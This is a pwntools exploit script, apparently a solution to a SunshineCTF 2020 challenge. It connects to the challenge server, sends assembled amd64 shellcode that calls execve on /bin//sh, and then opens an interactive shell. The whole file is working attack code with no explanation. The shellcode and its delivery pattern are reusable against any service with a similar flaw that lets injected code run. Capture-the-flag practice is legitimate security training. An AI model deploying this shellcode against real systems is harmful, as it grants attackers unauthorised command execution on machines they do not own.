from pwn import *

context.arch = "amd64"

p = remote("chal.2020.sunshinectf.org", 30007)


a = """
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push b'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall

"""


sc = asm(a)

buf = b''
buf += sc

p.sendline("A")
p.sendline(buf)
p.interactive()
